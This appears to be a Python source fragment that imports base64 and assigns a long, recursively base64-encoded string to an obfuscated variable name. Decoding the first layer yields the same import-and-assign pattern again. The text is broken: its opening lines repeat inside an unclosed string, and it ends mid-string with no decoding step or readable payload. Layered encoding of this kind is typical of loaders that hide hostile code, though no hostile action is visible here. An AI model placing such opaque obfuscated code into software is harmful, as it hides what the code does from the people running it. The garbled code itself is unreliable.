import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3diRFZSYWtwb1ZucEJNbGRzYUc5a01XeFlUbGQwYTFJd1duQlVNalZQWkVac1dWTnFRbWhXZWxaeVYyeGpNVTFGT1hWVmJXaGFZbXMwZDFscVRrSlBWVFZGWTBod2FVMXNiM2RhUldSSFlWZE5lbFZ1V21wU1JFRjNWREkxVDJJeVJsaFhha0pyVFcxNGNscEZaRzVQVlRWRllqQjBTbVZWUmpCVE1tdDNXakZyZVU5WGRHaFdlbFoxVkRKc1EwMVhVa2hYV0ZKUVVUQkdNRk15YTNkVE1HdzFUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzVXpGd2RWTnVXbWxWTUVveVdUQmtWMlJXY0ZsVGJtUk5ZbFJzTmxwSGJFTmpSMHBaVVc1YWFtSnNSbTVYYlRGellrZEtTRlZ1Y0UxUk1Fb3lXWHBPV2xNeGNIVlRibHBwVlRCS2NsZFdhRk5pUjFKSVlraFNZVlV3U25kWmJHaERaRzFPZFZWWFpHRlNNRmwzVjJ4b1UyTkhTbGhXV0U1aFVqQlpkMWRzUm5aaGEzaFVUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSa1ozWVcxS1NGSnVjR3BsVlVvMVYyeG9UMlF4WjNsVWJscHBZbFp3ZDFreU1IaGhSbXQ1WWtoYWFXRlhhREJaYWtwVFlrZEtTVlJZVmxWV2VteHlWMnhrTTJORk9XNWlNbVJLVVRCR2JsZEVTVEZoUjBwWVZsZGtVVlV3Um5WWk1qRlhaVzFPUjA5WGNHbE5hbFowV1Zab1MyUkdiRmhVYmtKcFRXcFNkVkV5YkVKYU1HeEVVVzFhWVZJeFdqWlhWRTVMWTBkT1NWVnVRbWxOYWxKdVZVWk9RMDFWYkhOVWJscHBVako0Y1ZsV2FGTk5WbkJFVVcxMFlWVXdTbkJrZW1SM1pXMU9XVlp0ZUdGU01GWnVWMnRrVmxveGEzbFBXRlpoWWxkNE5WbHNaRWRoYlVacVZETndhV0ZWU2pWWGJHUlBZMFpzZEdKSGRGcFZNR3hNVTFWT1Fsb3diRWRQV0d4aFZqQTFiVmx0TVVka1JuQlVVVlJzU2xFeVVqRlpha2w0WVZkT2RGWlhOVVJoVlVadVUxVk9RMkV4Y0ZoWFYyUnFZbFphTmxrd1l6VmtWbkJJVm01c1dVMHdOVEpaYTJSellXMUdXVlZxUm1GUk1tZzJWMnhrTkdKVmVFUlJiWEJxWVZoa2JscEdaSE5oTUhoRVVXNUNZVk5GTVhwVFZXUlBaRzFLZFZWdGVHeFRSa1UxVmtjd05XUldjRlJoZWxwRVlWVkdibE5WVGtKYU1HeEVVVmRrYW1KV1duVlRWVkYzV2pKTmVWWnVUbUZoVkZad1dUSXdOVTB5VFhsV1Z6bGFUVEJzZWxOVmFGZGpSbkJFWkRKa2FGWXhTalpVUlU1RFlXMUplVTVVUW1GWFIyZDNWVVprVDJSdFNuVlZiWGhzVTBaR2QxWXpjRU5hUlU1d1VWZGtTbEV3Um01VFZVNUNXakZzZEU5WGRHeFZNRVUxVTFWT2FtSnJUbkJSVjJSS1VUQkdibE5WVGtKYU1XeDBUMWQwYkZVd1JubFZSazVDWVZkTmVVOVlUbWhXTURWM1drVm9WMkV3T1hCV2JuQk5VVEJzYmxOc1RrSmlNazUwVm0wMVRXSnJOVEpaYTJSellXMUdXVlZxUm1GUk1uUk1VMVZPUWxvd2JFUlJWMlJLVVRCS2NGbHFTbE5PVld4RVkzcHNTbEV3YjNkWmFrbDRaR3M1Y0ZadWNFMVJNR3h1VTJ4T1FtSXlUblJXYlRWTllteEtNbGxzWXpSalJVNXdVVmRrU2xFd1JtNVRWVTVDV2pGc2RFOVhkR3hWTUVaNVZVWk9RbUZXY0hSUFdFNW9WbnBuTWxOc2FFNWpNR3h3VVZkNFNsRXlhRFZYYkdScVpGWndkRTlZVG1oV2VtaDNVVEpzUWxvd2JFUlJWMlJLVVRCR2JsZFhNRFZoTWxaVVVWaEtVVlV3Um5CWmJUVlhaRVp3V1ZOdVdsQmhWbG8yVkVWT1Nsb3djRlJSVnpscVlsWmFkVlJITURGTlYwcFlWbTVzYVdWWGRFeFRWVTVDV2pCc1JGRlhaRXBSTUVwd1dXcEtVMDVWYkVSamVteEtVVEJ3TVZscVNYaGhWMDUwVmxSYVMxZEZNWHBUVjJ4Q1lrVnNSR0ZJYkdGV01rNHhXVzB3TldSR2JIVlRiWGhNVlZjNWJsTlZUa0phTUd4RVVWZGtTbEl3Y0RKWGEyaHlXakIwTmsxSFpFcGlWVm96VjJ4a05HTXlSbGhWYmxwT1ZrYzVjMWt6YkROaFZXeEVWbGRrVEZORmNITlhibXN4WVVkT1NGWnVUbWxTTW5oeVdXNXdSbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNV3gwVDFkMGJGVXdSbmxWUms1Q1lWWnNXVkZ0ZUdsU00yaDNWMnRqTkdWVk9YQldibkJOVVRCc2JsTnNUa0ppTWs1MFZtMDFUV0pWV2pOWGJHUTBZekpHV0ZWdVdrNWhWM1JNVTFWT1Fsb3diRVJSVjJSS1VUQktjRmxxU2xOT1ZXeEVZM3BzU2xFd2NIUlhiR1JQWWpGc1YwOVlWbHBXTURBeVUyeG9UbU13YkhCUlYzaEtVVEpvTmxwRmFFcGlNazUwVm0wMVRXSldjSE5YVkVwdllVWm5lVTVYYUZwbFYzUjNVVEpzUWxvd2JFUlJWMlJLVVRCR2JsZFhNRFZoTWxaVVVWaEtVVlV3Um5CWmEyaFhZbXhzV1ZOdFdtbGlWVnB4VkRKc1YyVnJlRVJUVjJSTFZUQkdkbGt5TVZkaWEzaDBaVVJHWVUxcldqVlhSRWt4WVVac05XRXdkRXBSTUVadVUxVk9RbG93YkVSUmJXeHBUV3hKTVZOVlRucFBWV3hFVTIweFlWWXdOWFpYVmxrMVlWWnNXVlpxUWxCaFZsbzJWRVZPU2xvd2NGUlJWemxxVFRGS05WTXdhRXRpUm5BMVRsY3hZVll3TlhaWFZsazFZVlpzV1ZacVFreFZNblJNVTFWT1Fsb3diRVJSVjJSS1VUQktjRmxxU2xOT1ZXeEVZM3BzU2xFeVVtcFpiV3hxVXpCc1JGRlhaRXBSTUVadVUxVk9RMkpYU1hwVFYyUnFZVlZLZDFsdGJFTmxWbkJZV1ROV2FtSldXblZYUkU1TFlrZE5lbEZZYUZsTmF6VXlXVzB4WVdOSFRuTlBXRUpoVTBVd01sRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzU0ZOdVdtRlRSM1J1VXpOdmQxb3diSFZWYmxwcFZucG5NbE5zYUU1ak1HeHdVVmQ0U2xFeVpIWlpNbXN4VFVkSmVVMVlXa3hWTW5STVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNV3gwVDFkMGJGVXdSbmxWUms1Q1lWWndkRTlZVG1oV2VtY3lVMnhvVG1Nd2JIQlJWM2hLVVRKa2Rsa3lhekZpVjBsNVpVaENhV1ZYZEhkUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWhUYmxwaFUwZDBibE16YjNkYU1HeDBUbFJHYVZZeFdqVlpibkIyWWtkT05XUXliRXBSTVZadVV6Qk9iMlZWZUhST1ZFWnBWakZhTlZsdWJISmpSVTV3VVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwU01IQXlWMnRvY2xvd2REWk5SMlJLWW10S2Ixa3lOVXRrYlU1WlZtNUNXbFpxYkhkWGExSjJZa2RPTldReWJFcFJNVlp1VXpCT2IyVlZlSFZSYldocVltdHdNbGt4YUZkalJteFhUMWhDWVZGNlZqRlpha2w0WVZkT2RGWllUbXBoVkZZelYxWm9TMlZYU1hwU2FrWm9WakJhYlZsV1pGSmtWMDVKVTI1YWEySlhlREZYVkVwellVVjRTVk5ZVm1wU01GbzFXVEl3TldWSFVsaGlSMmhaVFcxNGNsUkhNSGhOVjBwMFlrZHdhRmRGU25kWmJtdzBaVlY0ZFZGdGFHcGlhM0F5V1RGb1YyTkdiRmRQV0VKaFVYcFdjbGxXWXpWaGJIQlpWRzVDYW1WWVpIZFRNVVoyV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUmJXeHBUV3hKTVZOVlRucFBWV3hFVTI1Q1lVMXVhSE5aZWtwellVWm5lV0pIZEZCaFZsbzJWRVZPU2xvd2NGUlJWemxNVTBWc01WbFdaR3RqTVhCWlZHNUNXbFpxYkhkWGEwMHhaRmRKZVUxWGJHcGlWbFo2VXpGT2NsTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrV21KVWJISmFWazVDWTJ4Q1ZGRlhiR3BTTUZvMVdrVmtjMkV4YkZkUFdFNW9WMFpLYzFreU1VZGpNRGx3Vm01d1RWRXdiRzVUYkU1Q1lqQjBTVk5ZVm1wU01GbzFXa1ZrYzJFeGJGZFBXRTVvVjBaS2Mxa3lNVWRqTUhSVVlUQjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VjFjd05XRXlWbFJSV0VwUlZUQkdjRmx0TURWa1JteDFVMjE0VUdGV1dqWlVSVTVLV2pCd1ZGRlhPVXhUUld3eFdXMHdOV1JHYkhWVGJYaE1WVEowVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqRnNkRTlYZEd4Vk1FWjVWVVpPUW1GV2JGbFJiWGhwVWpOb2QxZHJZelJsUlRsd1ZtNXdUVkV3Ykc1VGJFNUNZakIwU1ZOWVZscFhSVXB6V1d0a05HTkdjRWhQU0doTVZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGc2RFOVhkR3hWTUVaNVZVWk9RbUZXYkZsUmJYaHBVak5vZDFkcll6UmxWVGx3Vm01d1RWRXdiRzVUYkU1Q1lqQjBTVk5ZVmxwWFJVcHpXV3RrTkdOR2NFaFBTR3hNVlRKMFRGTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakZzZEU5WGRHeFZNRVo1VlVaT1FtRldjSFJXYlhCb1VqQmFiVmx0TVVkaGF6bHdWbTV3VFZFd2JHNVRiRTVDWWpKTmVsVnViRXhUUld3eFYyMHhWMkZ0UmtoU2JWcHBZbFZhY1ZNeFRuSlRNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkZwaVZHeHlXbFpPUW1Oc1FsUlJWMnhwVTBaYWRWZFdhRXRhYlVwMFVtMXdVR0ZXV2paVVJVNUtXakJ3VkZGWE9VeFRSV3d4V1d0b1YySnNiRmxUYlZwcFlsVmFjVk14VG5KVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRnBpVkd4eVdsWk9RbU5zUWxSUlYyeGhZbFphY1ZsVlpFZGFiR3gwVW1wR2ExSkhPWE5aTTJ3ellWVnNSRlpYWkV4Uk1tZzFWRWN4WVdKR2EzbGhSMmhaVFd0d2IxcEdhRkpqUlhSU1lqSmtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRXB3V1dwS1UwNVZiRVJqZW14S1VUQndObGRzYUc5a2F6bHdWbTV3VFZFd2JHNVRiRTVDWWpCMFNWTllWbXBOYkZrd1dXNXNjbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsSXdjREpYYTJoeVdqQjBOazFIWkVwaVZGWXlXa1ZrUms1cmNGbFVXRTVLWVZWR2MxTlZUbTVpTWs1d1RsaFdhVTB4U205VE1VNXlVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSYVlsUnNjbHBXVGtKamJFSlVVVmRzYWxKcWJERlpha2w0WVZkT2RGWlVXa3RYUlRGNlUxZHNRbUpGYkVSYU1qbHFZVlJXTTFkRVNURmtiVXBZVTI1c1lWVXlkSGRSTW14Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFaFRibHBoVTBkMGJsTXpiM2RhTUd4MVVXMWFhV0pVYkRCWFZ6VkxZa1U1Y0ZadWNFMVJNR3h1VTJ4T1FtSXdkRWxUV0ZacVVtcHNNVmxxU1hoaFYwNTBWbGhDVEZWWE9XNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RMkZYU1hsVmFsWktVVE5OTlZOVlRrdGtNV2Q1VW01a1lWWXphSHBaVm1SVFpHc3hWV0l5ZUdwbFdHUndVMVZPVmxvd2RFUmhTR3hOWW10S2JWZFdhRU5pUjBwSVpVaENZVko2YURSVE1VNXlVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSYVlsUnNjbHBXVGtKamJFSlVVVmRzYWxKcWJHOVpNR1JYWXpKS1NHSkhkR2xsYTJzeVUyeG9UbU13YkhCUlYzaEtVVEprZGxreWF6RmtNV2Q1VW01a1lWWXphSHBaVm1SVFpHc3hjR0V6UWtSaFZVWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZaRXRrYkhCSllUSmtUR1ZxUW01VFZ6VkRXbTFLU1ZadE5WcFhSWEJ0V1cweFIyRnJPWEJXYm5CTlVUQnNibE5zVGtKaU1IUkpVMWhXYWxKcWJIcGFSbVJyWVVkT2MwOVlWbHBXTURGM1V6RkdkbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVcxc2FVMXNTVEZUVlU1NlQxVnNSRk51VWxsTmFsWXlXV3hrUzJWV2NGVmlNbmhxWlZoa2NGTlZUbFphTUhSRVlVaHNUV0pVUm0xWmJUQTFaRVpzZFZOdGVFeFZNblJNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1XeDBUMWQwYkZVd1JubFZSazVDWVZkS1YwOVhhR3BTTVZwNldXdGtjMkV5U2paU1ZGcExWMFV4ZWxOWGJFSmlSV3hFV2pJNWFtRlVWakJYUkVwSFpERndXR1ZJVG1oV01Vb3lWRlpPY21ORlRuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEl3Y0RKWGEyaHlXakIwTmsxSFpFcGlWRVp0VjFab1EySkhTa2hsU0VKaFVucG9OVlF5YkZkbGEzaEVVMWRrUzFVd1JuWlRNR2hLWkZkS1YwOVhhR3BTTVZwNldXdGtjMkV5U2paVFdFSk1WVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFlWZEplVlZxVmtwUk0wMDFVMVZPUzJSR1ozbGxSRVpoVFd0YU5WZEVTVEZoUm13MllqSjRhbVZZWkhCVFZVNVdXakIwUkdGSWJFMWlWRVp0V1d0b1YySnNiRmxUYlZwcFlsVmFjVk14VG5KVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRnBpVkd4eVdsWk9RbU5zUWxSUlYyeHFVbXBzTTFkRVNURmtiVXBZVTI1c1lWWkhPWE5aTTJ3ellWVnNSRlpYWkV4Uk1tZzFWRWMxUTFwdFRrZFBXRlpwVFdwR2NGa3lNVlpqUlhSU1lqSmtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRXB3V1dwS1UwNVZiRVJqZW14S1VUQndNRmRFVGtOYWJVcDBUMWhTV21KcmNITlVNbXhYWld0NFJGTlhaRXRWTUVaMlV6Qm9TbVJYU2xkUFdHUlpUV3BXTWxsc1pFdGxWbkJVWVROQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZrUzJSc2NFbGhNbVJNWldwQ2JsTlhOVU5hYlVwWFQxaFdhVTFxUm5CWk1qRldUbXR3V1ZSWVRrcGhWVVp6VTFWT2JtSXlUbkJPV0dSWlRXcEdiVmx0TURWa1JteDFVMjE0VEZVeWRFeFRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG94YkhSUFYzUnNWVEJHZVZWR1RrSmhWMHBYVDFoU1dVMXFWakpaYkdSTFpWWndWV0l5ZUdwbFdHUndVMVZPVmxvd2RFUmhTR3hOWWxSR2JWbHNXVFZrVjBsNVRWZHNhbUpXVm5kVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYld4cFRXeEpNVk5WVG5wUFZXeEVVMjVTV2xZeFNqVlpWbU14WVVVNWNGWnVjRTFSTUd4dVUyeE9RbUl3ZEVsVFdGWnBWakJhY2xreU1YTmtWbXhVWVROQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZrUzJSc2NFbGhNbVJNWldwQ2JsTlhOVU5oUm5CSlUyNUNhV0pVWnpKVGJHaE9ZekJzY0ZGWGVFcFJNbVIyV1RKck1XUXhiRmhWYm14b1ZucFdNbE14VG5KVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRnBpVkd4eVdsWk9RbU5zUWxSUlYyeHBWako0TVZsV2FFOU5SMDUwVDBSYVMxZEZNWHBUVjJ4Q1lrVnNSRm95T1dwaFZGWXdXVlpqTVdOSFRYcFZibXhwWlZSV01WbHFTWGhoVjA1MFZsaE9hbUZVVmpCWlZtTXhZMGROZWxWdWJHbGxWRlp2V1RCa1YyTXlTa2hpUjNScFpXdFdlbGt5YXpGa1IwWllUbGhDYWsweFNqVlpibXN4WVVkT1NGWnVUbWxTTW5oeVdXNXdTbU15VG5CT1dGSm9WbnBXZDFsNlRsTmxWMG8xVGxjeFlWWXdOWFpYVmxrMVpGWnNXRlJZVG1waFZGWXdXVlpqTVdOSFRYcFZibXhwWlZSV2VscEdaR3RoUjA1elQxaFdXbFl3TVhwWk1tc3haRWRHV0U1WVFtcE5NVW8xV1c1ck1XUnRUblJWYlhocFlrUnNkMWRyVFRGa1YwbDVUVmRzYW1KV1ZucFRNVTV5VXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUmFZbFJzY2xwV1RrSmpiRUpVVVZkc2FWWXllREZaVm1oUFRVZE9kRTlYV21wTk1Wb3pXV3RrVms1cmNGbFVXRTVLWVZWR2MxTlZUbTVpTWs1d1RsaFNhRlo2Vm5kWmVrNVRaVmRKZUU5WWNHdFhSVXA2VjJ4Tk1XUlhTWGxOVjJ4cVlsWldlbGt5YXpGa1IwWllUbGhDYWsweFNqVlpha1UxWlcxU1dWRnVUbUZWZWxadldUQmtWMk15U2toaVIzUnBaV3RXZWxreWF6RmtSMFpZVGxoQ2FrMHhTalZaYWtVMVpXMVNXVkZ1VG1GVmVsWnZXVEJrVjJNeVNraGlSM1JwWld0c2Vsa3lhekZrUjBaWVRsaENhazB4U2pWWmFrVTFaVzFTV1ZGdVRtRlZlbFowVjJ4a1QySXhiRmRQV0ZaYVZqQXhlbGt5YXpGa1IwWllUbGhDYWsweFNqVlpha1UxWlcxU1dWRnVUbUZWZWxaNldrWmthMkZIVG5OUFdGWmFWakF4ZWxreWF6RmtSMFpZVGxoQ2FrMHhTalZaYWtVMVpXMVNXVkZ1VG1GVmVsWXlXVEl4VTJKSFNuTlBXRUpoVVhwV01WbHFTWGhoVjA1MFZsaE9URlV5ZEV4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3hiSFJQVjNSc1ZUQkdlVlZHVGtKaFYwcElZa1JDWVZkRmNHOVphMWsxVFVad1dXRkVRbEJoVmxvMlZFVk9TbG93Y0ZSUlZ6bE1VMFZzTVZsclpITk5SbkJaVTIxb2FWSnFhM2RYYkdodlRVVjBWR0V3ZEVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsZFhNRFZoTWxaVVVWaEtVVlV3Um5CWmJHUlhaVzFTU0dKRVdtbGxiVGx6V1ROc00yRlZiRVJXVjJSTVVUSm9OVlJITUhoaVIwMTZWVzVDYkdKVWFERlpiVEExWkVac2RWTnRlRXhWTW5SdVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSlRNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkZwaVZHeHlXbFpPUW1Oc1FsUlJWelZaVW5wU2RWRXliRUphTUd4RVVWZGtTbEV3Um01WmJHUkhZMGRLUjA5WVdscGlWemx1VlVaT1EyVnNjRmhsUnpGTlltdEtNbGxxU2pOa1ZtOTVWbXBDVEZFeVVqQlhWbVJ6WXpCNGRFMVhlR3BOTURWdlYycEtWbUpyZEZKaU1tUktVVEJHYmxOVlRrSmFNR3hJVDFoa1drMVViSEZaYWtreFlsWm5lVTlYYkdoaFZVVTFVMVZvVDJKSFNraFhXRlpxVW5wc01sbHJUVEZpYkhCWlZWYzVTMDFxYkROWFZFcHpaRzFLZEZadWNGbE5helV5V1cweFdtSnJkRkppTW1SS1VUQkdibE5WVGtKYU1HeElWRzVhYW1KcmNITlhSRXBQWkcxS2RGZHRXbWxOYTNCNFUxVlJkMW95VFhsV2JrNWhZVlJXTTFscVNUVmpNSGgwV2tkNGExRXlaSFZaZWtwSFlXMU9kRkp0V2xwTmFtdzFXVEl4VjJSc1ozbFVibHBwWWxad2QxZHViR3BqUlU1d1VWZGtTbEV3Um01VFZVNUNXakpKZWxGdGNGbE5helV5V1cweFlWcHRSbGhWYm5CS1VrUkNibGxxVGtOaGJHZDVWRzVhYVdKV2NHMVpha3BMWTFWNGRWUnRlRnBYUlhCeFdWVk9iMkZ0VG5Ca01tUnJWako0Y2xSRlRrTlpiR2hVWkRKa1drMXFiREZhUldSWFRrZFNSVTFYY0dsTmFsVjNWMnhvYjAxRmRGSmlNbVJLVVRCR2JsTlZUa0phTUd4SVQxaGtXazFVYkhGWmFra3hZbFZzUlUxSFpHbE5NRXB4VjBSS1QyUnRTblJYYlZwcFRXdHdlRlJITVV0bFYwbDZXa2h3WVZVeWFIRlpNbXd6V2pKU1dHSkhkRTFTZW13elYxUkZOV0Z0U1hsT1Z6RlpUVzE0Y2xremJEUmhiVWw1VGxSQ1lWZEhaM2RWUm1SUFpHMUtkVlZ0ZUd4VFJrWjNWak53UTFwRmJFaGlSekZLVW5wc00xZFVSVFZoYlVsNVRsY3hXVTF0ZUhKWk0yeERZa2RLU1ZSdGVFcFNWRll5V1cweFZsTXdiRVJSVjJSS1VUQkdibE5WVGtKVE1HeEVVVmRrU2xFd1JtNVRWVTVEWVcxSmVsTnViR0ZXZW14dFdWWmtVMlZyYkVWTlIyUmFUV3BzTlZreU1WZGFiR3Q1VDFoV1lXSkViREpYVnpGMlpGZE5lVlp0YUdwaVZUVjJVekJrVDJWVmVFUlJha1pvVmpGR2VsTlZXbnBpYTNCd1dUTk9URkV5VWpWWGJHaFBaREpKZVU1WGRHRldhbXcyV1dwS05HTkdiRFZaTTA1TFpXcENkVlJGV2xObFYxSllWbGhDVFZFeVpIVlhWRWsxWlZkT2RGWnVXa3RsV0dSMVZVWk9hbU15VG5SV2JUVk5ZbFUxTWxreU5VdGlSMGw0VDFkd2FVMXFWblJaVm1ScldtMUdXRlZZVmxwTmFtdzFXVEl4VjJScmRGZE5TRTVLVWpBMU1sbHROVk5pUjFaSlZWUnNXazFxYkRGYVJXUlhUa2RTUkdFd2RFcFJNRVp1VTFWT1Fsb3diRVJSYlhocFZqQmFkMWxyV1RWTlIwbzFVVlJzU2xFeVRuVlJNbXhDV2pCc1JGRlhaRXBSTUVadVdWWmtXbG94YTNsUFdHeHFZbFphTWxkRVNuTmhNazQyWWpCMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVWMnhqZUdGSFJsaGxSMXByVW5wb2JsVkdUa05sVm5CWVdUTldXazFxYkRWWk1qRlhaR3huZVZSdVdtbGlWbkIzVjJwRk5XTkdjRVJPVjNCcFRUQndOVmRzWXpSVE1HeEVVVmRrU2xFd1JtNVRWVTVEWkVkTmVWcEhXbXRpVlZwNldUTnNRazlWYkVsak1IUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUYWs1UFRWWnNkR05IZUZwTk1VWjFWREpzUTAxVmIzaFRiWGhxVFRCSmVGZHNhRTlOUm14VVVXMXNNMDR6UWpaWk1XaFhZa1p3U0ZKWFpHRlNNVlp1VjFjeFIwMVhVa2hpU0hCcFZucG9ibE13VG1wamJVMTZWVzVzVEZORmNITlhibXN4WlcxSmVXVklRbHBOYlhkM1drWmtVbU5GZERWWk0wSkxaVmhrVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnZlVlZ0YUd0U01WWjFWREpzUTJFeGJGbFZiWGhyVWpKNE1GZHNUVEZrVjBsNldUSTVURlY2VmpaYVJXaExZbGRTU0dKSVVtRlZNbVIxVTJ4YWNtUkZjRmhOU0ZKTFZqRkdkVk14VGpOVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXROTVZvMlYyeG9TMXB0UmxoVlZ6VlFZVlZKZUZsV1pGSmpNRTV3VVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1sSXdXV3BLVTJKSFNrUlplbHBLVVRKU05WZHNhRTlrTVdkNVZHNWFhV0pXY0hkWk1qQjRZVVpyZVdKSVdtbGhWMDU2VVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVXa2hzWVZkRk5XMVpWbVJTWW1zNWNGRnViR0ZXTWs1NlVUSnNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFV2tkc2FVMXNTVEZYUkU1VFlrZFdTVlZYTlZCaFZVcHdXV3BLVTA1VmVFSmlNbVJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um5WWGJHTjRZVWRHV0dWSFdtRmlhM0F5V1d4T2FrNXJiRWhQV0dSYVRWUnNjVmxxU1RGaVZYaDBWRzVhYW1KcmNITlpha1UxWlZad1dFMVlRbXRSTUVwM1YyMXNRMlJ0VGtoVWJWcGFUV3BzTVZkdGJFTmlSMHBKVkcxNFNsRXlUblZVUlVaMldqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWelZoVm5wR2IxbFdaRFJhYlZKSVQwYzFVR0ZWU25OWmJHUkhZMGRLUjA5VVFtbGxXR1JNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HOTVWbTVTV2xZeWVIcFhSRXBQWVd0d05tSXlaRXRsVjA1NlVUSnNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFV2tkNGFWWXdXbmRaYTFrMVlWWnJlVlJYTlZCaFYwNTFWRVZHZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWYzFhbUpXV2pOWmEyaHpXbTFTU0U5SE5WQmhWVVoxVTI1c00xTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrUzAxcVJuTlplazVQWVVadmVWWnRXbWhXTVVaMVZESnNRMVF5U1hsT1YzaE5VVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1ltMU9kRlp0TVdGWFJYQnpXVzB4VDJKSFRqVlplbHBLVWxSV01sbHRNVlpqTUU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNbEkyV2taa1MwMUhWbGxSYlhoTFpXMDVibE5xVGtOak1XeFlZa2hXUzJWWVpFeFRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YjNsaFIzaGFWakZLYzFreU5VNWlhemx3VVdzNWFVMXFWbk5VUlVaMldqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWelZwVmpCYWQxbHJXVFZsYkhCWlUycEtZVmRGY0cxWlZtUlNZbXM1Y0ZGck9XbE5hbFp6VkVWR2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmMxYWsweFNtOWFSV1JXWW1zNWNGRlhOV2xOTVZsM1YycEpOV05IU25SWk1qVk5VVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1lteHNXVlpxUW1sTlZHeHlWMnhrTkdKSFVraFdWelZRWVZWS1NGZFdaRFJsYkhCU1lqSmtTbEV3Um01VFZVNUNXakJzU1UxRmRFcFJNRVp1VTFWT1Fsb3diRVJSYmxKYVZqSjRlbGRFU25OaE1HeEZUVWRrYVZZd1duZFphMWsxWkd4c2RHSXpWbHBOTUhCelYxWm9VMkpGZEVoVWJteE5VVEJKZUZsV1pGSmpNR3hJVFZod1lVMVVhM2xYVm1RMFpXdDRSRkZ0Y0dsTmFsVjNWMnhvYjAxRmRGSmlNbVJLVVRCR2JsTlZUa0phTUd4SlUyMTRhazB3Um01VlJrNURaRVpzV0dKSVRsbE5hbXh3V1Zkck1XVnNjRmhPVjNSTVVqQTFOVlJGVGtOTlYwWllWVmhPU2xKdVVqQlhWbVJ6WXpGbmVXSkhkRmxWTTJSdVZtdG9TMDFXY0ZSbFIzQnBUV3BWZDFkc2FHOU5SWFJVVVZka1